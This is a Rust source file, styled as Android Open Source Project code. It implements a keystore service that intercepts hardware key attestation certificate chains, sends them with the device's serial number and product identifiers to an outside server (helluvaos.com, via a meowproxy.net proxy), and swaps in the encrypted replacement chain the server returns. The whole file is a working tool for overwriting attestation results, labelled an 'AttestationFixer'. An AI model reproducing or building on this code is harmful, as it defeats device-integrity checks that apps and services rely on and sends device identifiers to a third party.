//
// Copyright 2024, The Android Open Source Project
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

//! This crate implements droidfoodattestation.

use android_hardware_security_keymint::aidl::android::hardware::security::keymint::{
    Algorithm::Algorithm, Digest::Digest, EcCurve::EcCurve, KeyParameter::KeyParameter,
    KeyParameterValue::KeyParameterValue, KeyPurpose::KeyPurpose, SecurityLevel::SecurityLevel,
    Tag::Tag,
};
use android_security_postprocessor::aidl::android::security::postprocessor::{
    CertificateChain::CertificateChain,
    IKeystoreCertificatePostProcessor::IKeystoreCertificatePostProcessor,
};
use android_security_postprocessor::binder::{Interface, Status};
use android_system_keystore2::aidl::android::system::keystore2::{
    Domain::Domain, IKeystoreService::IKeystoreService, KeyDescriptor::KeyDescriptor,
};
use android_system_keystore2::binder;
use droidfood_attestation_proto::overwrite::{
    OverwriteAttestationRequest, OverwriteAttestationResponse,
    OverwriteAttestationResponsePlaintext,
};
use log::{debug, error};
use openssl::hkdf::hkdf;
use openssl::md::Md;
use openssl::sha::sha256;
use openssl::symm::{Cipher, Crypter, Mode};
use protobuf::Message;
use reqwest::blocking::{Client, Response};
use rustutils::android::system_properties;
use std::io::Read;
use std::sync::OnceLock;
use std::time::{Duration, Instant};
use uuid::Uuid;

const BACKEND_GRPC_DIRECT_URL: &str = "https://greendroidfood-pa.helluvaos.com/mystic.attestation.public.v1.AttestationOverwriter/OverwriteAttestation";
const BACKEND_GRPC_PROXY_URL: &str = "https://greendroidfood-pa.meowproxy.net/mystic.attestation.public.v1.AttestationOverwriter/OverwriteAttestation";
const ERROR_SERVER_REQUEST: i32 = -2;
const ERROR_SERVER_RESPONSE: i32 = -3;
const KEYSTORE2_SERVICE: &str = "android.system.keystore2.IKeystoreService/default";
const RESPONSE_KEY_ALIAS_PREFIX: &str = "mystic_response_";
const RESPONSE_KEY_CHALLENGE_PREFIX: &str = "MysticAttestation response key v1:";
const RESPONSE_HKDF_INFO: &[u8] = b"MysticAttestation overwrite response v1";
const RESPONSE_AAD_PREFIX: &str = "MysticAttestation overwrite response aad v1:";
const RESPONSE_CERT_NOT_AFTER_MS: i64 = 2_461_449_600_000;
const BACKEND_CONNECT_TIMEOUT: Duration = Duration::from_secs(5);
const BACKEND_REQUEST_TIMEOUT: Duration = Duration::from_secs(30);
const BACKEND_TCP_KEEPALIVE: Duration = Duration::from_secs(30);
const BACKEND_TCP_KEEPALIVE_INTERVAL: Duration = Duration::from_secs(10);
const BACKEND_TCP_USER_TIMEOUT: Duration = Duration::from_secs(45);
const BACKEND_RETRY_DELAY: Duration = Duration::from_millis(250);
const BACKEND_REQUEST_ATTEMPTS: usize = 3;
const GRPC_MAX_MESSAGE_BYTES: usize = 1024 * 1024;

static BACKEND_CLIENT: OnceLock<Result<Client, String>> = OnceLock::new();

/// Routes overwrite requests through the proxy instead of the direct backend.
pub const USE_BACKEND_PROXY: bool = true;

/// Enables verbose Droidfood-only diagnostics when this crate is built with debug assertions.
pub const ENABLE_INTENSIVE_LOGS_IN_DEBUG_BUILDS: bool = false;

/// Returns true when verbose Droidfood diagnostics should be emitted.
pub fn intensive_logs_enabled() -> bool {
    cfg!(debug_assertions) && ENABLE_INTENSIVE_LOGS_IN_DEBUG_BUILDS
}

fn backend_grpc_url() -> &'static str {
    if USE_BACKEND_PROXY {
        BACKEND_GRPC_PROXY_URL
    } else {
        BACKEND_GRPC_DIRECT_URL
    }
}

macro_rules! intensive_log {
    ($($arg:tt)+) => {
        if intensive_logs_enabled() {
            debug!($($arg)+);
        }
    };
}

/// The `IKeystoreCertificatePostProcessor` implementation.
pub struct KeystoreCertificatePostProcessor;

impl Interface for KeystoreCertificatePostProcessor {}

impl IKeystoreCertificatePostProcessor for KeystoreCertificatePostProcessor {
    fn processKeystoreCertificates(
        &self,
        old_keymint_certificates: &CertificateChain,
    ) -> Result<CertificateChain, Status> {
        if is_response_key_certificate(&old_keymint_certificates.leafCertificate) {
            intensive_log!("skipping overwrite for response encryption key attestation");
            return Ok(CertificateChain {
                leafCertificate: old_keymint_certificates.leafCertificate.clone(),
                remainingChain: old_keymint_certificates.remainingChain.clone(),
            });
        }

        let request_id = Uuid::new_v4().to_string();
        intensive_log!("sending attestation overwrite request: request_id={request_id}");

        let response_key = generate_response_key(&request_id)?;
        let response = request_overwrite(
            &request_id,
            &old_keymint_certificates.leafCertificate,
            &old_keymint_certificates.remainingChain,
            &response_key.certificate_chain,
        );
        let response = match response {
            Ok(response) => response,
            Err(OverwriteRequestError::InvalidArgument(message)) => {
                delete_key(&response_key.descriptor);
                intensive_log!(
                    "attestation overwrite rejected: request_id={request_id} message={message}"
                );
                return Err(service_error(ERROR_SERVER_REQUEST, &message));
            }
            Err(OverwriteRequestError::Backend(message)) => {
                delete_key(&response_key.descriptor);
                intensive_log!(
                    "attestation overwrite backend failed: request_id={request_id} error={message}"
                );
                return Err(service_error(ERROR_SERVER_REQUEST, &message));
            }
        };

        let decrypted = match decrypt_response(&request_id, &response_key.descriptor, &response) {
            Ok(decrypted) => decrypted,
            Err(err) => {
                delete_key(&response_key.descriptor);
                intensive_log!(
                    "attestation overwrite encrypted response failed: request_id={request_id} error={err}"
                );
                return Err(service_error(ERROR_SERVER_RESPONSE, &err));
            }
        };
        delete_key(&response_key.descriptor);

        if decrypted.leaf_certificate.is_empty() || decrypted.remaining_chain.is_empty() {
            intensive_log!(
                "server returned an incomplete encrypted certificate chain: request_id={request_id}"
            );
            return Err(service_error(
                ERROR_SERVER_RESPONSE,
                "Server returned an incomplete certificate chain.",
            ));
        }

        if decrypted.leaf_certificate == old_keymint_certificates.leafCertificate
            && decrypted.remaining_chain == old_keymint_certificates.remainingChain
        {
            error!(
                "attestation overwrite backend authorized original-chain fallback: request_id={request_id}"
            );
        }

        intensive_log!(
            "attestation overwrite response received: request_id={} leaf_bytes={} chain_bytes={}",
            request_id,
            decrypted.leaf_certificate.len(),
            decrypted.remaining_chain.len()
        );
        Ok(CertificateChain {
            leafCertificate: decrypted.leaf_certificate,
            remainingChain: decrypted.remaining_chain,
        })
    }
}

struct ResponseKey {
    descriptor: KeyDescriptor,
    certificate_chain: Vec<Vec<u8>>,
}

enum OverwriteRequestError {
    InvalidArgument(String),
    Backend(String),
}

enum OverwriteAttemptError {
    InvalidArgument(String),
    EmptyResponse,
    Retryable(String),
    Fatal(String),
}

fn request_overwrite(
    request_id: &str,
    leaf_certificate: &[u8],
    remaining_chain: &[u8],
    response_key_chain: &[Vec<u8>],
) -> Result<OverwriteAttestationResponse, OverwriteRequestError> {
    let mut request = OverwriteAttestationRequest::new();
    request.leaf_certificate = leaf_certificate.to_vec();
    request.remaining_chain = remaining_chain.to_vec();
    request.request_id = request_id.to_owned();
    request.device_attestation_chain = response_key_chain.to_vec();
    request.response_encryption_key_chain = response_key_chain.to_vec();

    let request_bytes = request.write_to_bytes().map_err(|err| {
        OverwriteRequestError::Backend(format!(
            "attestation overwrite request encode failed: {err:?}"
        ))
    })?;
    let request_frame = encode_grpc_frame(&request_bytes).map_err(|err| {
        OverwriteRequestError::Backend(format!("attestation overwrite request frame failed: {err}"))
    })?;
    let client = backend_client()?;
    let deadline = Instant::now() + BACKEND_REQUEST_TIMEOUT;

    for attempt in 1..=BACKEND_REQUEST_ATTEMPTS {
        let remaining = deadline.saturating_duration_since(Instant::now());
        if remaining.is_zero() {
            return Err(OverwriteRequestError::Backend(
                "attestation overwrite request deadline exceeded".to_owned(),
            ));
        }
        let retry_error = match request_overwrite_once(
            client,
            request_id,
            &request_frame,
            remaining,
        ) {
            Ok(response) => return Ok(response),
            Err(OverwriteAttemptError::InvalidArgument(message)) => {
                return Err(OverwriteRequestError::InvalidArgument(message));
            }
            Err(OverwriteAttemptError::Fatal(message)) => {
                return Err(OverwriteRequestError::Backend(message));
            }
            Err(OverwriteAttemptError::EmptyResponse) => {
                intensive_log!(
                    "attestation overwrite empty response retry: request_id={} attempt={}/{}",
                    request_id,
                    attempt,
                    BACKEND_REQUEST_ATTEMPTS
                );
                OverwriteRequestError::InvalidArgument("INVALID_ARGUMENT".to_owned())
            }
            Err(OverwriteAttemptError::Retryable(message)) => {
                intensive_log!(
                    "attestation overwrite transport retry: request_id={} attempt={}/{} error={}",
                    request_id,
                    attempt,
                    BACKEND_REQUEST_ATTEMPTS,
                    message
                );
                OverwriteRequestError::Backend(message)
            }
        };
        if attempt == BACKEND_REQUEST_ATTEMPTS {
            return Err(retry_error);
        }
        let retry_delay = BACKEND_RETRY_DELAY * attempt as u32;
        if deadline.saturating_duration_since(Instant::now()) <= retry_delay {
            return Err(retry_error);
        }
        std::thread::sleep(retry_delay);
    }
    unreachable!()
}

fn backend_client() -> Result<&'static Client, OverwriteRequestError> {
    match BACKEND_CLIENT.get_or_init(|| {
        Client::builder()
            .use_rustls_tls()
            .connect_timeout(BACKEND_CONNECT_TIMEOUT)
            .timeout(BACKEND_REQUEST_TIMEOUT)
            .http2_adaptive_window(true)
            .tcp_keepalive(BACKEND_TCP_KEEPALIVE)
            .tcp_keepalive_interval(BACKEND_TCP_KEEPALIVE_INTERVAL)
            .tcp_keepalive_retries(3_u32)
            .tcp_user_timeout(BACKEND_TCP_USER_TIMEOUT)
            .build()
            .map_err(|err| format!("attestation overwrite HTTP client failed: {err:?}"))
    }) {
        Ok(client) => Ok(client),
        Err(message) => Err(OverwriteRequestError::Backend(message.clone())),
    }
}

fn request_overwrite_once(
    client: &Client,
    request_id: &str,
    request_frame: &[u8],
    timeout: Duration,
) -> Result<OverwriteAttestationResponse, OverwriteAttemptError> {
    let mut response = client
        .post(backend_grpc_url())
        .header("content-type", "application/grpc")
        .header("te", "trailers")
        .header("user-agent", "DroidfoodAttestationFixer/0.1")
        .timeout(timeout)
        .body(request_frame.to_vec())
        .send()
        .map_err(|err| {
            OverwriteAttemptError::Retryable(format!(
                "attestation overwrite HTTP/2 failed: {err:?}"
            ))
        })?;

    let http_status = response.status();
    let grpc_status = response
        .headers()
        .get("grpc-status")
        .and_then(|value| value.to_str().ok())
        .map(str::to_owned);
    let grpc_message = response
        .headers()
        .get("grpc-message")
        .and_then(|value| value.to_str().ok())
        .filter(|value| !value.trim().is_empty())
        .map(str::to_owned)
        .unwrap_or_else(|| "INVALID_ARGUMENT".to_owned());
    let grpc_failed = match grpc_status.as_deref() {
        Some(status) => status != "0",
        None => false,
    };
    if !http_status.is_success() || grpc_failed {
        if grpc_status.as_deref() == Some("3") {
            return Err(OverwriteAttemptError::InvalidArgument(grpc_message));
        }
        let message = format!(
            "attestation overwrite rejected: http_status={http_status} grpc_status={grpc_status:?}"
        );
        if http_status.is_server_error() || http_status.as_u16() == 429 {
            return Err(OverwriteAttemptError::Retryable(message));
        }
        return Err(OverwriteAttemptError::Fatal(message));
    }

    let body = read_grpc_response_body(&mut response).map_err(OverwriteAttemptError::Retryable)?;
    if body.is_empty() && grpc_status.is_none() {
        intensive_log!(
            "attestation overwrite returned an empty gRPC body without exposed trailers; treating as INVALID_ARGUMENT: request_id={request_id}"
        );
        return Err(OverwriteAttemptError::EmptyResponse);
    }
    let payload = decode_grpc_frame(&body).map_err(|err| {
        OverwriteAttemptError::Retryable(format!(
            "attestation overwrite response frame failed: {err}"
        ))
    })?;
    OverwriteAttestationResponse::parse_from_bytes(&payload).map_err(|err| {
        OverwriteAttemptError::Retryable(format!(
            "attestation overwrite response decode failed: {err:?}"
        ))
    })
}

fn read_grpc_response_body(response: &mut Response) -> Result<Vec<u8>, String> {
    if response.content_length().is_some_and(|len| len > GRPC_MAX_MESSAGE_BYTES as u64 + 5) {
        return Err("attestation overwrite response exceeds the size limit".to_owned());
    }
    let mut body = Vec::new();
    response
        .take((GRPC_MAX_MESSAGE_BYTES + 6) as u64)
        .read_to_end(&mut body)
        .map_err(|err| format!("attestation overwrite response read failed: {err:?}"))?;
    if body.len() > GRPC_MAX_MESSAGE_BYTES + 5 {
        return Err("attestation overwrite response exceeds the size limit".to_owned());
    }
    Ok(body)
}

fn encode_grpc_frame(payload: &[u8]) -> Result<Vec<u8>, String> {
    if payload.len() > GRPC_MAX_MESSAGE_BYTES {
        return Err("request payload exceeds the gRPC message size limit".to_owned());
    }
    let len = u32::try_from(payload.len()).map_err(|_| "payload too large".to_owned())?;
    let mut frame = Vec::with_capacity(5 + payload.len());
    frame.push(0);
    frame.extend_from_slice(&len.to_be_bytes());
    frame.extend_from_slice(payload);
    Ok(frame)
}

fn decode_grpc_frame(body: &[u8]) -> Result<Vec<u8>, String> {
    if body.len() < 5 {
        return Err("response body is shorter than a gRPC frame header".to_owned());
    }
    if body[0] != 0 {
        return Err("compressed gRPC response is not supported".to_owned());
    }
    let len = u32::from_be_bytes([body[1], body[2], body[3], body[4]]) as usize;
    if len > GRPC_MAX_MESSAGE_BYTES {
        return Err("gRPC message payload exceeds the size limit".to_owned());
    }
    let frame_len =
        5usize.checked_add(len).ok_or_else(|| "gRPC message length overflow".to_owned())?;
    if body.len() < frame_len {
        return Err("response body ended before the gRPC message payload".to_owned());
    }
    if body.len() != frame_len {
        return Err("response body contained trailing gRPC data".to_owned());
    }
    Ok(body[5..frame_len].to_vec())
}

fn is_response_key_certificate(leaf_certificate: &[u8]) -> bool {
    let prefix = RESPONSE_KEY_CHALLENGE_PREFIX.as_bytes();
    leaf_certificate.windows(prefix.len()).any(|window| window == prefix)
}

fn generate_response_key(request_id: &str) -> Result<ResponseKey, Status> {
    let keystore = keystore_service()?;
    let security_level =
        keystore.getSecurityLevel(SecurityLevel::TRUSTED_ENVIRONMENT).map_err(|err| {
            service_error(ERROR_SERVER_REQUEST, &format!("keystore security level failed: {err:?}"))
        })?;
    let descriptor = KeyDescriptor {
        domain: Domain::APP,
        nspace: -1,
        alias: Some(format!("{RESPONSE_KEY_ALIAS_PREFIX}{request_id}")),
        blob: None,
    };
    let params = response_key_params(request_id, false);
    let metadata =
        match security_level.generateKey(&descriptor, None, &params, 0, b"MysticAttestation") {
            Ok(metadata) => metadata,
            Err(full_err) => {
                intensive_log!("full device identity rejected; retrying with serial: {full_err:?}");
                let serial_params = response_key_params(request_id, true);
                security_level
                    .generateKey(&descriptor, None, &serial_params, 0, b"MysticAttestation")
                    .map_err(|serial_err| {
                        service_error(
                            ERROR_SERVER_REQUEST,
                            &format!(
                                "response key generation failed: full={full_err:?}, \
                                 serial={serial_err:?}"
                            ),
                        )
                    })?
            }
        };

    let mut certificate_chain = Vec::new();
    let cert = metadata.certificate.ok_or_else(|| {
        service_error(ERROR_SERVER_REQUEST, "response key generation returned no certificate")
    })?;
    certificate_chain.push(cert);
    if let Some(chain) = metadata.certificateChain {
        if !chain.is_empty() {
            certificate_chain.push(chain);
        }
    }
    Ok(ResponseKey { descriptor: metadata.key, certificate_chain })
}

fn response_key_params(request_id: &str, serial_only: bool) -> Vec<KeyParameter> {
    let mut params = vec![
        key_param(Tag::ALGORITHM, KeyParameterValue::Algorithm(Algorithm::EC)),
        key_param(Tag::EC_CURVE, KeyParameterValue::EcCurve(EcCurve::P_256)),
        key_param(Tag::PURPOSE, KeyParameterValue::KeyPurpose(KeyPurpose::AGREE_KEY)),
        key_param(Tag::DIGEST, KeyParameterValue::Digest(Digest::SHA_2_256)),
        key_param(Tag::NO_AUTH_REQUIRED, KeyParameterValue::BoolValue(true)),
        key_param(
            Tag::ATTESTATION_CHALLENGE,
            KeyParameterValue::Blob(response_key_challenge(request_id)),
        ),
        key_param(
            Tag::CERTIFICATE_NOT_AFTER,
            KeyParameterValue::DateTime(RESPONSE_CERT_NOT_AFTER_MS),
        ),
        key_param(Tag::CERTIFICATE_SERIAL, KeyParameterValue::Blob(vec![1])),
    ];
    params.extend(device_attestation_params(serial_only));
    params
}

fn decrypt_response(
    request_id: &str,
    key: &KeyDescriptor,
    response: &OverwriteAttestationResponse,
) -> Result<OverwriteAttestationResponsePlaintext, String> {
    if response.encrypted_response.is_empty()
        || response.response_nonce.is_empty()
        || response.response_ephemeral_public_key.is_empty()
    {
        return Err("server returned an incomplete encrypted response".to_owned());
    }
    let secret = derive_keymint_secret(key, &response.response_ephemeral_public_key)?;
    let aes_key = derive_response_aes_key(request_id, &secret)?;
    let plaintext = aes_gcm_decrypt(
        &aes_key,
        &response.response_nonce,
        &response.encrypted_response,
        response_aad(request_id).as_bytes(),
    )?;
    OverwriteAttestationResponsePlaintext::parse_from_bytes(&plaintext)
        .map_err(|err| format!("response payload decode failed: {err:?}"))
}

fn derive_keymint_secret(key: &KeyDescriptor, peer_public_key: &[u8]) -> Result<Vec<u8>, String> {
    let keystore =
        raw_keystore_service().map_err(|err| format!("keystore connect failed: {err:?}"))?;
    let security_level = keystore
        .getSecurityLevel(SecurityLevel::TRUSTED_ENVIRONMENT)
        .map_err(|err| format!("keystore security level failed: {err:?}"))?;
    let params =
        vec![key_param(Tag::PURPOSE, KeyParameterValue::KeyPurpose(KeyPurpose::AGREE_KEY))];
    let operation = security_level
        .createOperation(key, &params, false)
        .map_err(|err| format!("response key operation failed: {err:?}"))?;
    let operation =
        operation.iOperation.ok_or_else(|| "response key operation missing".to_owned())?;
    operation
        .finish(Some(peer_public_key), None)
        .map_err(|err| format!("response key agreement failed: {err:?}"))?
        .ok_or_else(|| "response key agreement returned no secret".to_owned())
}

fn derive_response_aes_key(request_id: &str, secret: &[u8]) -> Result<[u8; 32], String> {
    let mut key = [0u8; 32];
    let salt = sha256(&response_key_challenge(request_id));
    hkdf(&mut key, Md::sha256(), secret, &salt, RESPONSE_HKDF_INFO)
        .map_err(|err| format!("response key derivation failed: {err:?}"))?;
    Ok(key)
}

fn aes_gcm_decrypt(
    key: &[u8],
    nonce: &[u8],
    encrypted: &[u8],
    aad: &[u8],
) -> Result<Vec<u8>, String> {
    const GCM_TAG_LEN: usize = 16;
    if encrypted.len() < GCM_TAG_LEN {
        return Err("encrypted response is too short".to_owned());
    }
    let (ciphertext, tag) = encrypted.split_at(encrypted.len() - GCM_TAG_LEN);
    let mut crypter = Crypter::new(Cipher::aes_256_gcm(), Mode::Decrypt, key, Some(nonce))
        .map_err(|err| format!("response decrypt init failed: {err:?}"))?;
    crypter.pad(false);
    crypter.aad_update(aad).map_err(|err| format!("response decrypt aad failed: {err:?}"))?;
    crypter.set_tag(tag).map_err(|err| format!("response decrypt tag failed: {err:?}"))?;
    let mut out = vec![0u8; ciphertext.len() + Cipher::aes_256_gcm().block_size()];
    let count = crypter
        .update(ciphertext, &mut out)
        .map_err(|err| format!("response decrypt update failed: {err:?}"))?;
    let rest = crypter
        .finalize(&mut out[count..])
        .map_err(|err| format!("response decrypt verify failed: {err:?}"))?;
    out.truncate(count + rest);
    Ok(out)
}

fn keystore_service() -> Result<binder::Strong<dyn IKeystoreService>, Status> {
    raw_keystore_service().map_err(|err| {
        service_error(ERROR_SERVER_REQUEST, &format!("keystore connect failed: {err:?}"))
    })
}

fn raw_keystore_service() -> binder::Result<binder::Strong<dyn IKeystoreService>> {
    Ok(binder::get_interface(KEYSTORE2_SERVICE)?)
}

fn delete_key(key: &KeyDescriptor) {
    match raw_keystore_service().and_then(|keystore| keystore.deleteKey(key)) {
        Ok(()) => intensive_log!("deleted response key"),
        Err(err) => error!("failed to delete response key: {err:?}"),
    }
}

fn key_param(tag: Tag, value: KeyParameterValue) -> KeyParameter {
    KeyParameter { tag, value }
}

fn device_attestation_params(serial_only: bool) -> Vec<KeyParameter> {
    let ids = if serial_only {
        &[(Tag::ATTESTATION_ID_SERIAL, "serialno")][..]
    } else {
        &[
            (Tag::ATTESTATION_ID_BRAND, "brand"),
            (Tag::ATTESTATION_ID_DEVICE, "device"),
            (Tag::ATTESTATION_ID_PRODUCT, "name"),
            (Tag::ATTESTATION_ID_SERIAL, "serialno"),
            (Tag::ATTESTATION_ID_MANUFACTURER, "manufacturer"),
            (Tag::ATTESTATION_ID_MODEL, "model"),
        ][..]
    };
    ids.iter()
        .filter_map(|&(tag, property)| {
            let value = get_attest_id_value(tag, property);
            if value.is_empty() {
                None
            } else {
                Some(key_param(tag, KeyParameterValue::Blob(value)))
            }
        })
        .collect()
}

fn get_attest_id_value(attest_id: Tag, prop_name: &str) -> Vec<u8> {
    if attest_id == Tag::ATTESTATION_ID_SERIAL {
        return get_system_prop(&format!("ro.{prop_name}"));
    }

    let attestation_prop = get_system_prop(&format!("ro.product.{prop_name}_for_attestation"));
    if !attestation_prop.is_empty() {
        return attestation_prop;
    }
    let vendor_prop = get_system_prop(&format!("ro.product.vendor.{prop_name}"));
    if !vendor_prop.is_empty() {
        return vendor_prop;
    }
    get_system_prop(&format!("ro.product.{prop_name}"))
}

fn get_system_prop(name: &str) -> Vec<u8> {
    match system_properties::read(name) {
        Ok(Some(value)) => value.as_bytes().to_vec(),
        _ => vec![],
    }
}

fn response_key_challenge(request_id: &str) -> Vec<u8> {
    format!("{RESPONSE_KEY_CHALLENGE_PREFIX}{request_id}").into_bytes()
}

fn response_aad(request_id: &str) -> String {
    format!("{RESPONSE_AAD_PREFIX}{request_id}")
}

fn service_error(code: i32, message: &str) -> Status {
    Status::new_service_specific_error_str(code, Some(message))
}
